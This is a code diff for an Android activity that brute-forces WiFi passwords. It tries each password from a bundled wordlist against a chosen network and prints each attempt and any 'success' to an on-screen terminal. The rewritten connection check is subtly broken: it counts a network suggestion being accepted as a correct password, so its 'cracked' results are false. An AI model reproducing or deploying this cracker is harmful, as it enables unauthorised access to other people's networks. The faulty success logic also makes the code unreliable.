@@ -1,8 +1,13 @@
 package com.example.mobilesentinel;
 
 import android.content.Context;
-import android.net.wifi.WifiConfiguration;
+import android.content.Intent;
+import android.net.wifi.WifiNetworkSuggestion;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities;
 import android.net.wifi.WifiManager;
+import android.net.wifi.WifiInfo;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
@@ -20,14 +25,14 @@ import java.util.List;
 
 public class WifiDetailsActivity extends AppCompatActivity {
 
-    private TextView wifiNameTextView;
-    private TextView securityTypeTextView;
-    private TextView networkModeTextView;
-    private TextView terminalOutput;
+    private TextView wifiNameTextView, securityTypeTextView, networkModeTextView, terminalOutput;
     private Button startWifiCrackerButton;
     private ScrollView scrollView;
     private WifiManager wifiManager;
     private Handler handler;
+    private String wifiName;
+    private boolean isCracking;
+    private String foundPassword = null;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,19 +49,27 @@ public class WifiDetailsActivity extends AppCompatActivity {
 
         // Initialize WifiManager
         wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-
-        // Initialize Handler for UI updates
         handler = new Handler(Looper.getMainLooper());
 
         // Get WiFi data from Intent
-        String wifiName = getIntent().getStringExtra("WIFI_NAME");
+        wifiName = getIntent().getStringExtra("WIFI_NAME");
         String capabilities = getIntent().getStringExtra("CAPABILITIES");
 
         // Display WiFi information
         displayWifiInfo(wifiName, capabilities);
 
-        // Set up button to start WiFi cracking
-        startWifiCrackerButton.setOnClickListener(view -> startWiFiCrackingProcess(wifiName));
+        // Register network callback to detect connections
+        registerNetworkCallback();
+
+        // Start cracking process
+        startWifiCrackerButton.setOnClickListener(view -> {
+            if (!isCracking) {
+                isCracking = true;
+                startWiFiCrackingProcess();
+            } else {
+                Toast.makeText(this, "Already cracking!", Toast.LENGTH_SHORT).show();
+            }
+        });
     }
 
     private void displayWifiInfo(String wifiName, String capabilities) {
@@ -81,38 +94,45 @@ public class WifiDetailsActivity extends AppCompatActivity {
         }
     }
 
-    private void startWiFiCrackingProcess(String wifiName) {
+    private void startWiFiCrackingProcess() {
         if (wifiName == null || wifiName.isEmpty()) {
             Toast.makeText(this, "WiFi name is missing. Unable to start cracking process.", Toast.LENGTH_SHORT).show();
             return;
         }
 
-        // Read the wordlist from assets
+        // Read wordlist from assets
         List<String> wordlist = readWordlistFromAssets();
         if (wordlist == null || wordlist.isEmpty()) {
             updateTerminalOutput("Error: Wordlist is empty or could not be read.\n");
             return;
         }
 
-        updateTerminalOutput("Starting WiFi cracking for network: " + wifiName + "\n");
+        updateTerminalOutput("Starting WiFi cracking for: " + wifiName + "\n");
 
-        // Start cracking process in a background thread
+        // Start cracking in background thread
         new Thread(() -> {
             for (String password : wordlist) {
+                if (foundPassword != null) {
+                    break; // Stop if password was found
+                }
+
                 final String currentPassword = password;
                 handler.post(() -> updateTerminalOutput("Trying password: " + currentPassword + "\n"));
 
                 boolean isConnected = tryConnectToWifi(wifiName, currentPassword);
                 if (isConnected) {
+                    foundPassword = currentPassword;
                     handler.post(() -> {
-                        updateTerminalOutput("Success! Connected to WiFi with password: " + currentPassword + "\n");
+                        updateTerminalOutput("✅ Success! Connected to WiFi with password: " + currentPassword + "\n");
                         Toast.makeText(WifiDetailsActivity.this, "Connected to WiFi!", Toast.LENGTH_SHORT).show();
                     });
-                    return; // Stop if connected
+                    return;
                 }
             }
 
-            handler.post(() -> updateTerminalOutput("Failed to crack the password for network: " + wifiName + "\n"));
+            if (foundPassword == null) {
+                handler.post(() -> updateTerminalOutput("❌ Failed to crack the password for network: " + wifiName + "\n"));
+            }
         }).start();
     }
 
@@ -136,27 +156,41 @@ public class WifiDetailsActivity extends AppCompatActivity {
     }
 
     private boolean tryConnectToWifi(String ssid, String password) {
-        WifiConfiguration wifiConfig = new WifiConfiguration();
-        wifiConfig.SSID = String.format("\"%s\"", ssid);
-        wifiConfig.preSharedKey = String.format("\"%s\"", password);
+        WifiNetworkSuggestion suggestion =
+                new WifiNetworkSuggestion.Builder()
+                        .setSsid(ssid)
+                        .setWpa2Passphrase(password)
+                        .setIsAppInteractionRequired(true) // Ensures user is prompted
+                        .build();
 
-        int netId = wifiManager.addNetwork(wifiConfig);
-        if (netId == -1) {
-            return false; // Failed to add network
-        }
+        List<WifiNetworkSuggestion> suggestions = new ArrayList<>();
+        suggestions.add(suggestion);
 
-        wifiManager.disconnect();
-        wifiManager.enableNetwork(netId, true);
-        wifiManager.reconnect();
+        int status = wifiManager.addNetworkSuggestions(suggestions);
+        return status == WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS;
+    }
 
-        // Simulate a delay to check connection status
-        try {
-            Thread.sleep(5000); // Wait for 5 seconds
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
+    private void registerNetworkCallback() {
+        ConnectivityManager connectivityManager =
+                (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
 
-        return wifiManager.getConnectionInfo().getSSID().equals("\"" + ssid + "\"");
+        connectivityManager.registerDefaultNetworkCallback(new ConnectivityManager.NetworkCallback() {
+            @Override
+            public void onAvailable(Network network) {
+                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+                String connectedSSID = wifiInfo.getSSID().replace("\"", "");
+
+                if (connectedSSID.equals(wifiName) && foundPassword == null) {
+                    foundPassword = "Unknown (Detected connection)";
+                    handler.post(() -> updateTerminalOutput("✅ Connected to " + connectedSSID + "! Password unknown.\n"));
+                }
+            }
+
+            @Override
+            public void onLost(Network network) {
+                handler.post(() -> updateTerminalOutput("⚠️ Disconnected from WiFi.\n"));
+            }
+        });
     }
 
     private void updateTerminalOutput(String message) {
